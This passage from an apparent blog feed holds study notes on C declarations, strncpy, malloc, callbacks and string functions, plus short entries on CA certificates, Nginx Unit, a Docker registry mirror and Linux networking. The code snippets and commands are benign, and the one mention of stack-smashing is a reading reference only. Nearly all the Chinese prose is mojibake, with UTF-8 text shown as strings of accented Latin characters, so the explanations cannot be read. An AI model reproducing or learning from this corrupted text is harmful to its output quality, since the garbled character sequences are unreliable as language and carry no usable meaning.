class="code"><pre><code class="hljs scss">typedef char (*(*T1)<span class="hljs-selector-attr">[3]</span>)(void);<br>T1 <span class="hljs-built_in">x</span>(void);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>T1</code> å’Œ <code>*</code> ç»“åˆ, è¡¨æ˜å…¶ä¸ºä¸€ä¸ªæŒ‡é’ˆ, æŒ‡å‘ç±»å‹ <code>T2</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">char</span> <span class="hljs-params">(*T2[<span class="hljs-number">3</span>])</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-keyword">typedef</span> T2 *T1;<br><span class="hljs-function">T1 <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br></code></pre></td></tr></table></figure><p><code>T2</code> ä¸ <code>[3]</code> å…ˆç»“åˆ, è¡¨æ˜å…¶ä¸ºå«æœ‰ 3 ä¸ªå…ƒç´ çš„æ•°ç»„, å†å’Œå‰é¢çš„ <code>*</code> ç»“åˆ, è¡¨æ˜æ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„, æŒ‡å‘ç±»å‹ä¸º <code>T3</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> <span class="hljs-title">T3</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br><span class="hljs-keyword">typedef</span> T3 *T2[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">typedef</span> T2 *T1;<br><span class="hljs-function">T1 <span class="hljs-title">x</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>æœ€åå¯ä»¥çœ‹å‡º <code>T3</code> æ˜¯ä¸€ä¸ªå‡½æ•°ç±»å‹, å‚æ•°ä¸º <code>void</code> ç±»å‹, è¿”å›å€¼æ˜¯ <code>char</code> ç±»å‹.</p><p>é€’å½’ä¸‹é™æ³•è§£æå¤æ‚å£°æ˜.</p><p>ä»¥ä¸‹è®°å½•è‡ª K&amp;R ä¸€ä¹¦ <code>5.12</code> èŠ‚:</p><p>å£°æ˜ç¬¦ <code>dcl</code> å°±æ˜¯å‰é¢å¯èƒ½å¸¦å¤šä¸ª <code>*</code> çš„ <code>direct-ctl</code>.</p><p><code>direct-ctl</code> å¯ä»¥æ˜¯ name, ç”±ä¸€å¯¹åœ†æ‹¬å·æ‰©èµ·æ¥çš„ <code>dcl</code>, åé¢è·Ÿæœ‰ä¸€å¯¹åœ†æ‹¬å·çš„ <code>direct-dcl</code>, åé¢è·Ÿæœ‰ç”¨æ–¹æ‹¬å·æ‹¬èµ·æ¥è¡¨ç¤ºå¯é€‰é•¿åº¦çš„ <code>direct-dcl</code>.</p><p>ä¸¤ä¸ªå‡½æ•°ç›¸äº’é€’å½’è°ƒç”¨.</p><h1 id="ç¬¬23ç« -å‡½æ•°æ¥å£"><a href="#ç¬¬23ç« -å‡½æ•°æ¥å£" class="headerlink" title="ç¬¬23ç«  å‡½æ•°æ¥å£"></a>ç¬¬23ç«  å‡½æ•°æ¥å£</h1><p>å‡½æ•°æ¥å£çš„æè¿°, å‡½æ•°å, å‚æ•°, è¿”å›å€¼.</p><h3 id="23-1-1-strcpy-ä¸-strncpy"><a href="#23-1-1-strcpy-ä¸-strncpy" class="headerlink" title="23.1.1 strcpy ä¸  strncpy"></a>23.1.1 strcpy ä¸  strncpy</h3><p>ä¹¦ä¸­å»ºè®®å¤šæŸ¥é˜… man page.</p><p>ç¡®ä¿ dest ä»¥ <code>&#39;\0&#39;</code> ç»“å°¾:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">char</span> buf[<span class="hljs-number">10</span>];<br>strncpy(buf, <span class="hljs-string">&quot;hello word&quot;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>buf[<span class="hljs-keyword">sizeof</span>(buf)<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å‡½æ•°çš„ Man Page éƒ½æœ‰ä¸€éƒ¨åˆ†ä¸“é—¨è®²è¿”å›å€¼.</p><p><code>CONFORMING TO</code> éƒ¨åˆ†æè¿°äº†è¿™ä¸ªå‡½æ•°æ˜¯éµç…§é‚£äº›æ ‡å‡†å®ç°çš„.</p><p><code>NOTES</code> éƒ¨åˆ†ç»™å‡ºä¸€äº›æç¤ºä¿¡æ¯.</p><p><code>BUGS</code> éƒ¨åˆ†è¯´æ˜äº†ä½¿ç”¨è¿™äº›å‡½æ•°å¯èƒ½å¼•èµ·çš„ Bug.</p><p>ç¼“å†²åŒºæº¢å‡ºé—®é¢˜å¯èƒ½è¢«åˆ©ç”¨, æ¨èèµ„æ–™ â€œSmashing The Stack For Fun And Profitâ€.</p><h3 id="23-1-2-malloc-ä¸-free"><a href="#23-1-2-malloc-ä¸-free" class="headerlink" title="23.1.2 malloc ä¸ free"></a>23.1.2 malloc ä¸ free</h3><p>ä½äº stdlib ä¸­.</p><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå †ç©ºé—´, C æ ‡å‡†åº“å‡½æ•° malloc å¯ä»¥åœ¨å †ç©ºé—´åŠ¨æ€åˆ†é…å†…å­˜, å®ƒçš„åº•å±‚é€šè¿‡ brk ç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜.</p><p>malloc å‡½æ•°ä¿è¯å®ƒè¿”å›çš„æŒ‡é’ˆæŒ‡å‘çš„åœ°å€æ»¡è¶³ç³»ç»Ÿçš„å¯¹å…¶è¦æ±‚.</p><p>åŠ¨æ€åˆ†é…çš„å†…å­˜ç”¨ç©ä¹‹åå¯ä»¥è°ƒç”¨ free å‡½æ•°é‡Šæ”¾æ‰.</p><p>ç¼–å†™ç¨‹åºè¦è§„èŒƒ, malloc ä¹‹ååº”è¯¥åˆ¤æ–­æ˜¯å¦æˆåŠŸ.</p><p><code>free(p);</code> ä¹‹å, p æ‰€æŒ‡çš„å†…å­˜ç©ºé—´æ˜¯å½’è¿˜äº†, ä½†æ˜¯ p çš„å€¼å¹¶æ²¡æœ‰å˜, ä¸ºäº†é¿å…å‡ºç°é‡æŒ‡é’ˆ, å› è¯¥åœ¨ <code>free(p);</code> ä¹‹å, æ‰‹åŠ¨è®¾ç½® <code>p = NULL</code>.</p><p><code>malloc(0)</code> æ˜¯åˆæ³•çš„, è¿”å›ä¸€ä¸ªé NULL æŒ‡é’ˆ.</p><h2 id="23-2-ä¼ å…¥å‚æ•°ä¸ä¼ å‡ºå‚æ•°"><a href="#23-2-ä¼ å…¥å‚æ•°ä¸ä¼ å‡ºå‚æ•°" class="headerlink" title="23.2 ä¼ å…¥å‚æ•°ä¸ä¼ å‡ºå‚æ•°"></a>23.2 ä¼ å…¥å‚æ•°ä¸ä¼ å‡ºå‚æ•°</h2><p>æŠŠæŒ‡é’ˆæ‰€æŒ‡å‘çš„æ•°æ®ä¼ ç»™å‡½æ•°ä½¿ç”¨è¢«ç§°ä¸ºä¼ å…¥å‚æ•°.</p><p>ç”±å‡½æ•°å¡«å……æŒ‡é’ˆæ‰€æŒ‡çš„å†…å­˜ç©ºé—´, ä¼ å›ç»™è°ƒç”¨è€…ä½¿ç”¨, è¢«ç§°ä¸ºä¼ å‡ºå‚æ•°.</p><p>æ—¢æ˜¯ä¼ å…¥å‚æ•°åˆæ˜¯ä¼ å‡ºå‚æ•°çš„è¢«ç§°ä¸º Value-result å‚æ•°.</p><p>å¾ˆå¤šç³»ç»Ÿå‡½æ•°å¯¹äºæŒ‡é’ˆå‚æ•°æ˜¯ NULL çš„æƒ…å†µæœ‰ç‰¹æ®Šè§„å®š, å¦‚æœä¼ å…¥å‚æ•°æ˜¯ NULL è¡¨ç¤ºå–é»˜è®¤å€¼, ä¹Ÿå¯èƒ½è¡¨ç¤ºä¸åšç‰¹åˆ«å¤„ç†. ä¼ å‡ºå‚æ•°æ˜¯ NULL è¡¨ç¤ºè°ƒç”¨è€…ä¸éœ€è¦ä¼ å‡ºå€¼.</p><h2 id="23-3-ä¸¤å±‚æŒ‡é’ˆçš„å‚æ•°"><a href="#23-3-ä¸¤å±‚æŒ‡é’ˆçš„å‚æ•°" class="headerlink" title="23.3 ä¸¤å±‚æŒ‡é’ˆçš„å‚æ•°"></a>23.3 ä¸¤å±‚æŒ‡é’ˆçš„å‚æ•°</h2><h2 id="23-4-è¿”å›å€¼æ˜¯æŒ‡é’ˆçš„æƒ…å†µ"><a href="#23-4-è¿”å›å€¼æ˜¯æŒ‡é’ˆçš„æƒ…å†µ" class="headerlink" title="23.4 è¿”å›å€¼æ˜¯æŒ‡é’ˆçš„æƒ…å†µ"></a>23.4 è¿”å›å€¼æ˜¯æŒ‡é’ˆçš„æƒ…å†µ</h2><h2 id="23-5-å›è°ƒå‡½æ•°"><a href="#23-5-å›è°ƒå‡½æ•°" class="headerlink" title="23.5 å›è°ƒå‡½æ•°"></a>23.5 å›è°ƒå‡½æ•°</h2><p>å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ, è°ƒç”¨è€…å¯ä»¥ä¼ é€’ä¸€ä¸ªå‡½æ•°çš„åœ°å€ç»™å®ç°è€…, å³è°ƒç”¨è€…æä¾›ä¸€ä¸ªå‡½æ•°ä½†è‡ªå·±ä¸å»è°ƒç”¨å®ƒ, è€Œæ˜¯è®©å®ç°è€…å»è°ƒç”¨å®ƒ, è¿™è¢«ç§°ä¸ºå›è°ƒå‡½æ•° (Callback Function).</p><p>è¿™é‡Œæœ‰ä½¿ç”¨ <code>void *</code> æŒ‡é’ˆ.</p><p>å›è°ƒå‡½æ•°çš„ä¸€ä¸ªå…¸å‹åº”ç”¨å°±æ˜¯å®ç°ç±»ä¼¼ C++ çš„æ³›å‹ç®—æ³• (Generics Algorithm).</p><p>å¼‚æ­¥è°ƒç”¨ä¹Ÿæ˜¯ä¼šæ‰å‡½æ•°çš„ä¸€ç§å…¸å‹ç”¨æ³•, è°ƒç”¨è€…é¦–å…ˆå°†å›è°ƒå‡½æ•°ä¼ ç»™å®ç°è€…, å®ç°è€…è®°ä½è¿™ä¸ªå‡½æ•°, è¿™ç§°ä¸º <mark>æ³¨å†Œ</mark> ä¸€ä¸ªå›è°ƒå‡½æ•°, ç„¶åå½“æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å®ç°è€…å†è°ƒç”¨å…ˆå‰æ³¨å†Œè¿‡çš„å‡½æ•°.</p><p>æ“ä½œå‡½æ•°çš„å‡½æ•°ç§°ä¸ºé«˜é˜¶å‡½æ•° (High-order Function).</p><h2 id="23-6-å¯å˜å‚æ•°"><a href="#23-6-å¯å˜å‚æ•°" class="headerlink" title="23.6 å¯å˜å‚æ•°"></a>23.6 å¯å˜å‚æ•°</h2><p>è¦å¤„ç†å¯å˜å‚æ•°, éœ€è¦ç”¨åˆ° C æ ‡å‡†åº“çš„ <code>va_list</code> ç±»å‹å’Œ <code>va_start</code>, <code>va_arg</code>, <code>va_end</code> å®, éƒ½å®šä¹‰åœ¨ <code>stdarg.h</code> å¤´æ–‡ä»¶ä¸­.</p><h1 id="ç¬¬24ç« -C-æ ‡å‡†åº“"><a href="#ç¬¬24ç« -C-æ ‡å‡†åº“" class="headerlink" title="ç¬¬24ç«  C æ ‡å‡†åº“"></a>ç¬¬24ç«  C æ ‡å‡†åº“</h1><p>Linux å¹³å°æä¾›çš„ C æ ‡å‡†åº“åŒ…æ‹¬:</p><ul><li>ä¸€ç»„å¤´æ–‡ä»¶, å®šä¹‰äº†å¾ˆå¤šç±»å‹å’Œå®, å£°æ˜äº†å¾ˆå¤šåº“å‡½æ•°å’Œå…¨å±€å˜é‡</li><li>ä¸€ç»„åº“æ–‡ä»¶, æä¾›äº†åº“å‡½æ•°å’Œå…¨å±€å˜é‡çš„å®šä¹‰</li></ul><h2 id="24-1-å­—ç¬¦ä¸²æ“ä½œå‡½æ•°"><a href="#24-1-å­—ç¬¦ä¸²æ“ä½œå‡½æ•°" class="headerlink" title="24.1 å­—ç¬¦ä¸²æ“ä½œå‡½æ•°"></a>24.1 å­—ç¬¦ä¸²æ“ä½œå‡½æ•°</h2><p>ç¨‹åºæŒ‰åŠŸèƒ½åˆ’åˆ†å¯åˆ†ä¸ºæ•°å€¼è®¡ç®—, ç¬¦å·å¤„ç†å’Œ I&#x2F;O æ“ä½œä¸‰ç±». ç¬¦å·å¤„ç†ç¨‹åºå ç›¸å½“å¤§çš„æ¯”ä¾‹.</p><h3 id="24-1-1-ç»™å­—ç¬¦ä¸²èµ‹åˆå€¼"><a href="#24-1-1-ç»™å­—ç¬¦ä¸²èµ‹åˆå€¼" class="headerlink" title="24.1.1 ç»™å­—ç¬¦ä¸²èµ‹åˆå€¼"></a>24.1.1 ç»™å­—ç¬¦ä¸²èµ‹åˆå€¼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-type">void</span> *s, <span class="hljs-type">int</span> c, <span class="hljs-type">size_t</span> n)</span></span>;<br></code></pre></td></tr></table></figure><p>é€šå¸¸è°ƒç”¨ memset æ—¶ä¼ ç»™ c çš„å€¼æ˜¯ 0, æŠŠä¸€å—å†…å­˜åŒºæ¸…é›¶.</p><p>C æ ‡å‡†è¯´ memset å‡½æ•°è¦æŠŠå‚æ•° c è½¬æ¢æˆ unsigned char å‹å†å¡«å……åˆ°æ¯ä¸ªå­—èŠ‚ä¸­.</p><p><code>ctype.h</code> ä¸­å£°æ˜çš„å­—ç¬¦å¤„ç†å‡½æ•° (å¦‚åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ä¹‹ç±»). C æ ‡å‡†è§„å®šä¼ ç»™è¿™äº›å‡½æ•°çš„å‚æ•°å¯ä»¥æ˜¯ EOF, EOF æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å€¼, å®ƒçš„ç±»å‹æ˜¯ int è€Œä¸æ˜¯ char, å¦‚æœè½¬æ¢æˆ char å‹ä¼šä¸¢å¤±ä¿¡æ¯.</p><p><img src="/../img/ctype.png" alt="ctype"></p><h3 id="24-1-2-å–å­—ç¬¦ä¸²çš„é•¿åº¦"><a href="#24-1-2-å–å­—ç¬¦ä¸²çš„é•¿åº¦" class="headerlink" title="24.1.2 å–å­—ç¬¦ä¸²çš„é•¿åº¦"></a>24.1.2 å–å­—ç¬¦ä¸²çš„é•¿åº¦</h3><p>strlen.</p><p>è¿”å›çš„é•¿åº¦ä¸åŒ…æ‹¬ <code>&#39;\0&#39;</code> å­—ç¬¦.</p><h3 id="24-1-2-æ‹·è´å­—ç¬¦ä¸²"><a href="#24-1-2-æ‹·è´å­—ç¬¦ä¸²" class="headerlink" title="24.1.2 æ‹·è´å­—ç¬¦ä¸²"></a>24.1.2 æ‹·è´å­—ç¬¦ä¸²</h3><p>strcpy å’Œ strncpy å‡½æ•°, æ‹·è´ä»¥ NULL ç»“å°¾çš„å­—ç¬¦ä¸².</p><p>memcpy å’Œ memmove å‡½æ•°, æ‹·è´å›ºå®šçš„å­—èŠ‚æ•°.</p><p>ä»¥ str å¼€å¤´çš„å‡½æ•°æ“ä½œä»¥ Null ç»“å°¾çš„å­—ç¬¦ä¸², è€Œä»¥ mem å¼€å¤´çš„å‡½æ•°åˆ™ä¸å…³å¿ƒ <code>&#39;\0&#39;</code> å­—ç¬¦, æˆ–è€…è¯´è¿™äº›å‡½æ•°åªæ˜¯æŠŠå‚æ•°çœ‹åšæ˜¯ n ä¸ªå­—èŠ‚, å¹¶ä¸çœ‹åšå­—ç¬¦ä¸², å› æ­¤å‚æ•°çš„æŒ‡é’ˆç±»å‹æ˜¯ <code>void *</code> è€Œé <code>char *</code>.</p><p>memmove èƒ½å¤Ÿæ‹·è´é‡å åŒºåŸŸ.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº ca-certificate å’Œ CA è®¤è¯</title>
    <link href="/2022/09/12/%E5%85%B3%E4%BA%8E-ca-certificate-%E5%92%8C-CA-%E8%AE%A4%E8%AF%81/"/>
    <url>/2022/09/12/%E5%85%B3%E4%BA%8E-ca-certificate-%E5%92%8C-CA-%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/CA%E8%AE%A4%E8%AF%81/6471579?fr=aladdin">å‚è€ƒ</a><br>CA è®¤è¯, å³ç”µå­è®¤è¯æœåŠ¡, æ˜¯æŒ‡ä¸ºç”µå­ç­¾åç›¸å…³ä¸ªæ–¹é¢æä¾›çœŸå®æ€§, å¯é æ€§éªŒè¯çš„æ´»åŠ¨.</p><p>CA, Certificate Authority, å³è¯ä¹¦é¢å‘æœºæ„. è´Ÿè´£å‘æ”¾å’Œç®¡ç†æ•°å­—è¯ä¹¦çš„æƒå¨æœºæ„, å¹¶ä½œä¸ºç”µå­å•†åŠ¡äº¤æ˜“ä¸­å—ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹, æ‰¿æ‹…å…¬é’¥ä½“ç³»ä¸­å…¬é’¥çš„åˆæ³•æ€§æ£€éªŒçš„è´£ä»».</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Nginx Unit Cookbook Notes</title>
    <link href="/2022/09/10/Nginx-Unit-Cookbook-Notes/"/>
    <url>/2022/09/10/Nginx-Unit-Cookbook-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-Unit-Introduction-and-Features"><a href="#Chapter-1-Unit-Introduction-and-Features" class="headerlink" title="Chapter 1 Unit Introduction and Features"></a>Chapter 1 Unit Introduction and Features</h1><h2 id="1-2-Dynamic-Web-Application-Server"><a href="#1-2-Dynamic-Web-Application-Server" class="headerlink" title="1.2 Dynamic Web Application Server"></a>1.2 Dynamic Web Application Server</h2><p>NGINX Unit is a dynamic web application server, which means that it can be dynamically reconfigured during runtime without dropping requests.</p><h1 id="Chapter-2-Installation"><a href="#Chapter-2-Installation" class="headerlink" title="Chapter 2 Installation"></a>Chapter 2 Installation</h1><h2 id="Debian-Based-Systems-deb"><a href="#Debian-Based-Systems-deb" class="headerlink" title="Debian-Based Systems (.deb)"></a>Debian-Based Systems (.deb)</h2>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ docker pull ç¼“æ…¢</title>
    <link href="/2022/09/10/%E8%A7%A3%E5%86%B3-docker-pull-%E7%BC%93%E6%85%A2/"/>
    <url>/2022/09/10/%E8%A7%A3%E5%86%B3-docker-pull-%E7%BC%93%E6%85%A2/</url>
    
    <content type="html"><![CDATA[<p>åŒæ ·éœ€è¦æ¢æº, åœ¨ <code>/etc/docker</code> ç›®å½•ä¸­æ·»åŠ  <code>daemon.json</code> æ–‡ä»¶, ç„¶åæ·»åŠ </p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;https://yxzrazem.mirror.aliyuncs.com&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C è¯­è¨€ Notes</title>
    <link href="/2022/09/09/C-%E8%AF%AD%E8%A8%80-Notes/"/>
    <url>/2022/09/09/C-%E8%AF%AD%E8%A8%80-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h1><p>å…¶ç¬¬ä¸€ä¸ªå‚æ•°å€¼ä¸ºæ–‡ä»¶å.</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é¸Ÿå“¥çš„ Linux ç§æˆ¿èœ æœåŠ¡å™¨æ¶è®¾ç¯‡ Notes</title>
    <link href="/2022/09/08/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E7%AF%87-Notes/"/>
    <url>/2022/09/08/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E8%AE%BE%E7%AF%87-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -æ­å»ºæœåŠ¡å™¨å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#ç¬¬ä¸€ç« -æ­å»ºæœåŠ¡å™¨å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="ç¬¬ä¸€ç«  æ­å»ºæœåŠ¡å™¨å‰çš„å‡†å¤‡å·¥ä½œ"></a>ç¬¬ä¸€ç«  æ­å»ºæœåŠ¡å™¨å‰çš„å‡†å¤‡å·¥ä½œ</h1><h2 id="1-2-æ­å»ºæœåŠ¡å™¨çš„åŸºæœ¬æµç¨‹"><a href="#1-2-æ­å»ºæœåŠ¡å™¨çš„åŸºæœ¬æµç¨‹" class="headerlink" title="1.2 æ­å»ºæœåŠ¡å™¨çš„åŸºæœ¬æµç¨‹"></a>1.2 æ­å»ºæœåŠ¡å™¨çš„åŸºæœ¬æµç¨‹</h2><h3 id="1-2-1-ç½‘ç»œæœåŠ¡å™¨æˆåŠŸè¿æ¥çš„åˆ†æ"><a href="#1-2-1-ç½‘ç»œæœåŠ¡å™¨æˆåŠŸè¿æ¥çš„åˆ†æ" class="headerlink" title="1.2.1 ç½‘ç»œæœåŠ¡å™¨æˆåŠŸè¿æ¥çš„åˆ†æ"></a>1.2.1 ç½‘ç»œæœåŠ¡å™¨æˆåŠŸè¿æ¥çš„åˆ†æ</h3><p>æŸ¥è¯¢å·²å¯åŠ¨çš„ç½‘ç»œç›‘å¬æœåŠ¡:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -tulnp</span><br></code></pre></td></tr></table></figure><p>ç½‘ä¸Šé‚»å±…éœ€è¦å®‰è£…çš„æ˜¯ Samba è¿™ä¸ªè½¯ä»¶.</p><h1 id="ç¬¬äºŒç« -ç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µ"><a href="#ç¬¬äºŒç« -ç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç¬¬äºŒç«  ç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µ"></a>ç¬¬äºŒç«  ç½‘ç»œçš„åŸºæœ¬æ¦‚å¿µ</h1><h2 id="2-1-ç½‘ç»œ"><a href="#2-1-ç½‘ç»œ" class="headerlink" title="2.1 ç½‘ç»œ"></a>2.1 ç½‘ç»œ</h2><h3 id="2-1-1-ä»€ä¹ˆæ˜¯ç½‘ç»œ"><a href="#2-1-1-ä»€ä¹ˆæ˜¯ç½‘ç»œ" class="headerlink" title="2.1.1 ä»€ä¹ˆæ˜¯ç½‘ç»œ"></a>2.1.1 ä»€ä¹ˆæ˜¯ç½‘ç»œ</h3><h3 id="2-1-2-è®¡ç®—æœºç½‘ç»œç»„æˆç»„ä»¶"><a href="#2-1-2-è®¡ç®—æœºç½‘ç»œç»„æˆç»„ä»¶" class="headerlink" title="2.1.2 è®¡ç®—æœºç½‘ç»œç»„æˆç»„ä»¶"></a>2.1.2 è®¡ç®—æœºç½‘ç»œç»„æˆç»„ä»¶</h3><p>æ¯éƒ¨ä¸»æœºçš„å†…éƒ¨éƒ½æ‹¥æœ‰ä¸€ä¸ªå†…éƒ¨çš„ç½‘ç»œæ¥å£ï¼Œå³ loopback (lo) è¿™ä¸ªå¾ªç¯æµ‹è¯•æ¥å£.</p><h3 id="2-1-3-è®¡ç®—æœºç½‘ç»œçš„èŒƒå›´"><a href="#2-1-3-è®¡ç®—æœºç½‘ç»œçš„èŒƒå›´" class="headerlink" title="2.1.3 è®¡ç®—æœºç½‘ç»œçš„èŒƒå›´"></a>2.1.3 è®¡ç®—æœºç½‘ç»œçš„èŒƒå›´</h3><h3 id="2-1-4-è®¡ç®—æœºç½‘ç»œåè®®-OSI-ä¸ƒå±‚åè®®"><a href="#2-1-4-è®¡ç®—æœºç½‘ç»œåè®®-OSI-ä¸ƒå±‚åè®®" class="headerlink" title="2.1.4 è®¡ç®—æœºç½‘ç»œåè®®: OSI ä¸ƒå±‚åè®®"></a>2.1.4 è®¡ç®—æœºç½‘ç»œåè®®: OSI ä¸ƒå±‚åè®®</h3><p>Open System Interconnection, æ— è®ºæ˜¯æ¥æ”¶ç«¯è¿˜æ˜¯å‘é€ç«¯ï¼Œæ¯ä¸€å±‚æ¬¡åªè®¤è¯†å¯¹æ–¹çš„åŒä¸€å±‚çš„æ•°æ®.</p><p>åœ¨ä¸ƒå±‚åè®®ä¸­, æ¯å±‚éƒ½ä¼šæœ‰è‡ªå·±ç‹¬ç‰¹çš„å¤´éƒ¨æ•°æ® (header).</p><p>TCP&#x2F;IP ç®€åŒ–ä¸º 4 å±‚. å…¶å°†åº”ç”¨, è¡¨ç¤º, ä¼šè¯ä¸‰å±‚æ•´åˆæˆä¸€ä¸ªåº”ç”¨å±‚, å°†æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚æ•´åˆæˆç½‘ç»œæ¥å£å±‚.</p><h2 id="2-2-TCP-IP-çš„ç½‘ç»œæ¥å£å±‚çš„ç›¸å…³åè®®"><a href="#2-2-TCP-IP-çš„ç½‘ç»œæ¥å£å±‚çš„ç›¸å…³åè®®" class="headerlink" title="2.2 TCP\IP çš„ç½‘ç»œæ¥å£å±‚çš„ç›¸å…³åè®®"></a>2.2 TCP\IP çš„ç½‘ç»œæ¥å£å±‚çš„ç›¸å…³åè®®</h2><h3 id="2-2-1-å¹¿åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡"><a href="#2-2-1-å¹¿åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡" class="headerlink" title="2.2.1 å¹¿åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡"></a>2.2.1 å¹¿åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡</h3><h4 id="1-ä¼ ç»Ÿç”µè¯æ‹¨å·è¿æ¥-é€šè¿‡-PPP-åè®®"><a href="#1-ä¼ ç»Ÿç”µè¯æ‹¨å·è¿æ¥-é€šè¿‡-PPP-åè®®" class="headerlink" title="1. ä¼ ç»Ÿç”µè¯æ‹¨å·è¿æ¥: é€šè¿‡ PPP åè®®"></a>1. ä¼ ç»Ÿç”µè¯æ‹¨å·è¿æ¥: é€šè¿‡ PPP åè®®</h4><p>PPP åè®® (Point-to-Point Protocol).</p><p>PPP åè®®æ”¯æŒ TCP&#x2F;IP, NetBEUI, IPX&#x2F;SPX ç­‰é€šä¿¡åè®®.</p><h4 id="2-æ•´åˆæœåŠ¡æ•°å­—ç½‘ç»œ-Integrated-Services-Digital-Network-ISDN"><a href="#2-æ•´åˆæœåŠ¡æ•°å­—ç½‘ç»œ-Integrated-Services-Digital-Network-ISDN" class="headerlink" title="2. æ•´åˆæœåŠ¡æ•°å­—ç½‘ç»œ (Integrated Services Digital Network, ISDN)"></a>2. æ•´åˆæœåŠ¡æ•°å­—ç½‘ç»œ (Integrated Services Digital Network, ISDN)</h4><h4 id="3-éå¯¹ç§°æ•°å­—ç”¨æˆ·ç¯è·¯-Asymmetric-Digital-Subscriber-Line-ADSL-ä½¿ç”¨-PPPoE-åè®®"><a href="#3-éå¯¹ç§°æ•°å­—ç”¨æˆ·ç¯è·¯-Asymmetric-Digital-Subscriber-Line-ADSL-ä½¿ç”¨-PPPoE-åè®®" class="headerlink" title="3. éå¯¹ç§°æ•°å­—ç”¨æˆ·ç¯è·¯ (Asymmetric Digital Subscriber Line, ADSL): ä½¿ç”¨ PPPoE åè®®"></a>3. éå¯¹ç§°æ•°å­—ç”¨æˆ·ç¯è·¯ (Asymmetric Digital Subscriber Line, ADSL): ä½¿ç”¨ PPPoE åè®®</h4><p>ç”±äºä¸Šä¼ &#x2F;ä¸‹è½½çš„å¸¦å®½ä¸åŒ, å› æ­¤æ‰ç§°ä¸ºéå¯¹ç§°çš„ç¯è·¯.</p><p>PPPoE ä¸º PPP over Ethernet.</p><h4 id="4-ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨-Cable-Modem"><a 